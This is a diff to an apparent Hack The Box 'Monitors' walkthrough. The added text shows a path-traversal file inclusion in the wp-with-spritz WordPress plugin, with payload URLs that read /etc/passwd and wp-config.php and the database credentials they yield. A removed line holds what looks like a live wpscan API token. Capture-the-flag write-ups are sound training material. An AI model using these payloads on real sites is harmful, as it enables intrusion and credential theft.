@@ -74,7 +74,7 @@
 
 // We can check for vulnerabilities for Wordpress with [wpscan](https://wpscan.com/) tool
 
-    $ wpscan --url http://monitors.htb/ --api-token VAoJp6hTtEvYbvkCE4URq7GrJFGyOdNkA4tMfQ2MeFE --plugins-detection mixed -e
+    $ wpscan --url http://monitors.htb/ --api-token YOUR_TOKEN --plugins-detection mixed -e
 -------
 
         _______________________________________________________________
@@ -117,6 +117,31 @@
 
         ......
 
-// The output of wpscan shows us there is vulnerability of Unauthenticated File Inclusion
+// The output of wpscan shows us there is vulnerability of wp-spritz plugin - Unauthenticated File Inclusion
 
-// Lets exploit that
+// Navigating to https://www.exploit-db.com/exploits/44544/ will help us to understant 
+
+![Image 3]()
+
+// Lets try that
+
+    http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd
+    
+![Image 4]()
+
+// It worked !
+
+// We can check for WordPress configuration file calle 'wp-config.php'
+
+    http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php
+
+![Image 5]()
+
+// We got Credentials !  wpadmin : BestAdministrator@2020!
+
+// Trying to connect to Wordpress with those credentials didnt work
+
+// So, Since we got successed with the LFI lets try to find some interesting files
+
+// First we need linux directories list, found amazing [lfi-linux-list](https://github.com/carlospolop/hacktricks/blob/a140aa95ee5b53aa4c367cd6d8c5cb96d50dc381/pentesting-web/file-inclusion/lfi-linux-list.md
+)(By carlospolop)
